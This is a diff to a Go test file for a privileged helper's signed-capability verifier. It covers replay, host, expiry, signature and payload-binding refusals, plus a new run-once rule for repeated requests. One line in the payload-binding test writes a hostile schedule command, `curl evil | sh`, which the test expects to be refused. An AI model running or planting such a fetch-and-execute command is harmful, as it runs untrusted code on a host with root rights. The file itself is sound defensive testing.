@@ -98,10 +98,16 @@ func expectCode(t *testing.T, err error, code string) {
 	}
 }
 
+// verify keeps the tests that only care about the refusal reading as they did.
+func verify(v *Verifier, request *helperv1.HelperRequest) error {
+	_, err := v.Verify(request, Expect(request))
+	return err
+}
+
 func TestAValidCapabilityIsAcceptedOnce(t *testing.T) {
 	f := newFixture(t)
 	capability, signature := f.issue(Mint{})
-	if err := f.verifier.Verify(f.request(capability, signature), Expect(f.request(capability, signature))); err != nil {
+	if err := verify(f.verifier, f.request(capability, signature)); err != nil {
 		t.Fatalf("a valid capability was refused: %v", err)
 	}
 }
@@ -139,7 +145,7 @@ func TestHLP02ChangedPayloadIsAPayloadHashMismatch(t *testing.T) {
 	capability, signature := f.issue(Mint{})
 	request := f.request(capability, signature)
 	request.CanonicalPayload[len(request.CanonicalPayload)-3] ^= 0x01
-	expectCode(t, f.verifier.Verify(request, Expect(request)), ErrorPayloadMismatch)
+	expectCode(t, verify(f.verifier, request), ErrorPayloadMismatch)
 
 	// Under prefer the refusal reaches the caller; under observe it is
 	// recorded and the request passes.
@@ -152,65 +158,138 @@ func TestHLP02ChangedPayloadIsAPayloadHashMismatch(t *testing.T) {
 	}
 }
 
+// One capability covers a whole task, and a task calls the helper more than
+// once. So the nonce alone cannot decide: what must run once is one request
+// under it, and a second ask for the same request is answered rather than
+// performed.
+func TestTheSameRequestUnderOneCapabilityRunsOnce(t *testing.T) {
+	f := newFixture(t)
+	capability, signature := f.issue(Mint{})
+	request := f.request(capability, signature)
+
+	first, err := f.verifier.Verify(request, Expect(request))
+	if err != nil {
+		t.Fatalf("the first request was refused: %v", err)
+	}
+	if !first.Fresh || first.Kept != nil {
+		t.Fatalf("the first request was not reserved fresh: %+v", first)
+	}
+	if first.complete == nil {
+		t.Fatal("the first request carries no way to record its answer")
+	}
+	if err := first.complete([]byte("the answer of the effect")); err != nil {
+		t.Fatalf("recording the answer: %v", err)
+	}
+
+	// Asked again, the very same request gets that answer back and nothing
+	// runs a second time.
+	again, err := f.verifier.Verify(request, Expect(request))
+	if err != nil {
+		t.Fatalf("a repeat of a finished request was refused: %v", err)
+	}
+	if again.Fresh || string(again.Kept) != "the answer of the effect" {
+		t.Fatalf("the repeat was not answered from the record: %+v", again)
+	}
+
+	// Another request of the same task is other work and runs on its own.
+	other := f.request(capability, signature)
+	other.TimeoutSeconds = request.GetTimeoutSeconds() + 7
+	third, err := f.verifier.Verify(other, Expect(other))
+	if err != nil {
+		t.Fatalf("another request of the same task was refused: %v", err)
+	}
+	if !third.Fresh {
+		t.Fatalf("another request of the same task was taken for the first one: %+v", third)
+	}
+}
+
+// The digest names the request and not the order of a map in it: two
+// marshallings of one request must not look like two requests.
+func TestTheRequestDigestIgnoresTheOrderOfAMap(t *testing.T) {
+	settings := map[string]string{
+		"net.ipv4.ip_forward": "1", "kernel.dmesg_restrict": "1", "vm.swappiness": "10",
+	}
+	first := ""
+	for i := 0; i < 8; i++ {
+		request := &helperv1.HelperRequest{TaskId: "task-1",
+			Action: &helperv1.HelperRequest_Kernel{Kernel: &helperv1.KernelRequest{
+				Operation: helperv1.KernelRequest_OPERATION_SYSCTL_ENSURE,
+				Settings:  settings,
+			}}}
+		digest, err := RequestDigest(request)
+		if err != nil {
+			t.Fatalf("the digest of the request: %v", err)
+		}
+		if first == "" {
+			first = digest
+			continue
+		}
+		if digest != first {
+			t.Fatalf("one request gave two digests: %s and %s", first, digest)
+		}
+	}
+}
+
 // HLP-03: the nonce is consumed, the helper restarts, the same capability
 // comes again.
 func TestHLP03NonceReplayAfterRestartIsRefused(t *testing.T) {
 	f := newFixture(t)
 	capability, signature := f.issue(Mint{})
 	request := f.request(capability, signature)
-	if err := f.verifier.Verify(request, Expect(request)); err != nil {
+	if err := verify(f.verifier, request); err != nil {
 		t.Fatal(err)
 	}
-	if err := f.verifier.Verify(request, Expect(request)); err != nil {
-		t.Fatalf("the second request of the same task in the same life was refused: %v", err)
-	}
+	// The same request again, while the first is still on the books, is not a
+	// second effect. This test used to require it to pass, which is how the
+	// same signed order came to be carried out as often as it was asked for.
+	expectCode(t, verify(f.verifier, request), ErrorCapabilityInFlight)
 
 	restarted := f.openVerifier()
-	expectCode(t, restarted.Verify(request, Expect(request)), ErrorCapabilityReplay)
+	expectCode(t, verify(restarted, request), ErrorCapabilityReplay)
 
 	// A request that names another task than the capability does is not
 	// the task's own request.
 	other := f.request(capability, signature)
 	other.TaskId = "task-2"
-	expectCode(t, restarted.Verify(other, Expect(other)), ErrorWrongAction)
+	expectCode(t, verify(restarted, other), ErrorWrongAction)
 }
 
 func TestWrongHostIsRefused(t *testing.T) {
 	f := newFixture(t)
 	capability, signature := f.issue(Mint{HostID: "host-2"})
 	request := f.request(capability, signature)
-	expectCode(t, f.verifier.Verify(request, Expect(request)), ErrorWrongHost)
+	expectCode(t, verify(f.verifier, request), ErrorWrongHost)
 
 	// A helper without an identity yet refuses every capability the same
 	// way rather than trusting the capability's word about the host.
 	unnamed := NewVerifierWith("", NewKeyring(f.signer.PublicKey()), f.verifier.replay, f.verifier.now)
 	capability, signature = f.issue(Mint{})
 	request = f.request(capability, signature)
-	expectCode(t, unnamed.Verify(request, Expect(request)), ErrorWrongHost)
+	expectCode(t, verify(unnamed, request), ErrorWrongHost)
 }
 
 func TestWrongActionIsRefused(t *testing.T) {
 	f := newFixture(t)
 	capability, signature := f.issue(Mint{ActionType: string(opspec.ActionUnitStop)})
 	request := f.request(capability, signature)
-	expectCode(t, f.verifier.Verify(request, Expect(request)), ErrorWrongAction)
+	expectCode(t, verify(f.verifier, request), ErrorWrongAction)
 }
 
 func TestExpiredAndNotYetValidAreRefused(t *testing.T) {
 	f := newFixture(t)
 	capability, signature := f.issue(Mint{Now: f.now.Add(-6 * time.Minute)})
 	request := f.request(capability, signature)
-	expectCode(t, f.verifier.Verify(request, Expect(request)), ErrorCapabilityExpired)
+	expectCode(t, verify(f.verifier, request), ErrorCapabilityExpired)
 
 	capability, signature = f.issue(Mint{Now: f.now.Add(2 * time.Minute)})
 	request = f.request(capability, signature)
-	expectCode(t, f.verifier.Verify(request, Expect(request)), ErrorCapabilityExpired)
+	expectCode(t, verify(f.verifier, request), ErrorCapabilityExpired)
 
 	// A clock a little behind the panel's is forgiven at the start of the
 	// window, not at its end.
 	capability, signature = f.issue(Mint{Now: f.now.Add(45 * time.Second)})
 	request = f.request(capability, signature)
-	if err := f.verifier.Verify(request, Expect(request)); err != nil {
+	if err := verify(f.verifier, request); err != nil {
 		t.Fatalf("a capability issued 45 seconds ahead was refused: %v", err)
 	}
 }
@@ -223,7 +302,7 @@ func TestTTLTooLongIsRefused(t *testing.T) {
 	capability.ExpiresUnix = capability.NotBeforeUnix + int64((6 * time.Minute).Seconds())
 	signature := Sign(f.signer.key, capability)
 	request := f.request(capability, signature)
-	expectCode(t, f.verifier.Verify(request, Expect(request)), ErrorTTLTooLong)
+	expectCode(t, verify(f.verifier, request), ErrorTTLTooLong)
 
 	// A package transaction gets ten minutes.
 	if ClassOf(string(opspec.ActionPackageUpgrade)) != ClassPackages || TTLOf(string(opspec.ActionPackageUpgrade)) != 10*time.Minute {
@@ -247,18 +326,18 @@ func TestUnknownKeyAndBadSignatureAreRefused(t *testing.T) {
 		t.Fatal(err)
 	}
 	request := f.request(capability, signature)
-	expectCode(t, f.verifier.Verify(request, Expect(request)), ErrorUnknownKey)
+	expectCode(t, verify(f.verifier, request), ErrorUnknownKey)
 
 	// The right key identifier with somebody else's signature.
 	capability.KeyId = f.signer.KeyID()
 	request = f.request(capability, signature)
-	expectCode(t, f.verifier.Verify(request, Expect(request)), ErrorBadSignature)
+	expectCode(t, verify(f.verifier, request), ErrorBadSignature)
 
 	// A field changed after signing.
 	capability, signature = f.issue(Mint{})
 	capability.Grants = append(capability.Grants, GrantScheduleRootExec)
 	request = f.request(capability, signature)
-	expectCode(t, f.verifier.Verify(request, Expect(request)), ErrorBadSignature)
+	expectCode(t, verify(f.verifier, request), ErrorBadSignature)
 }
 
 func TestSchemaVersionIsCheckedFirst(t *testing.T) {
@@ -266,7 +345,7 @@ func TestSchemaVersionIsCheckedFirst(t *testing.T) {
 	capability, signature := f.issue(Mint{HostID: "host-2"})
 	capability.SchemaVersion = 2
 	request := f.request(capability, signature)
-	expectCode(t, f.verifier.Verify(request, Expect(request)), ErrorCapabilityVersion)
+	expectCode(t, verify(f.verifier, request), ErrorCapabilityVersion)
 }
 
 // The digest matches the bound payload, but the request names another
@@ -276,7 +355,7 @@ func TestPayloadBindingMismatchIsRefused(t *testing.T) {
 	capability, signature := f.issue(Mint{})
 	request := f.request(capability, signature)
 	request.GetUnitAction().Unit = "sshd.service"
-	expectCode(t, f.verifier.Verify(request, Expect(request)), ErrorPayloadBinding)
+	expectCode(t, verify(f.verifier, request), ErrorPayloadBinding)
 
 	// A schedule entry: the identifier, the user and the command are bound.
 	canonical, err := CanonicalPayload(opspec.ActionScheduleEnsure, opspec.ActionVersion, opspec.Payload{
@@ -291,12 +370,12 @@ func TestPayloadBindingMismatchIsRefused(t *testing.T) {
 		Action: &helperv1.HelperRequest_Schedule{Schedule: &helperv1.ScheduleRequest{
 			Operation: helperv1.ScheduleRequest_OPERATION_ENSURE, Id: "nightly", Expression: "0 2 * * *",
 			Command: []string{"/usr/bin/backup", "--full"}, User: "root"}}}
-	expectCode(t, f.verifier.Verify(schedule, Expect(schedule)), ErrorPayloadBinding)
+	expectCode(t, verify(f.verifier, schedule), ErrorPayloadBinding)
 	schedule.GetSchedule().User = "backup"
 	schedule.GetSchedule().Command = []string{"/bin/sh", "-c", "curl evil | sh"}
-	expectCode(t, f.verifier.Verify(schedule, Expect(schedule)), ErrorPayloadBinding)
+	expectCode(t, verify(f.verifier, schedule), ErrorPayloadBinding)
 	schedule.GetSchedule().Command = []string{"/usr/bin/backup", "--full"}
-	if err := f.verifier.Verify(schedule, Expect(schedule)); err != nil {
+	if err := verify(f.verifier, schedule); err != nil {
 		t.Fatalf("the matching schedule request was refused: %v", err)
 	}
 }
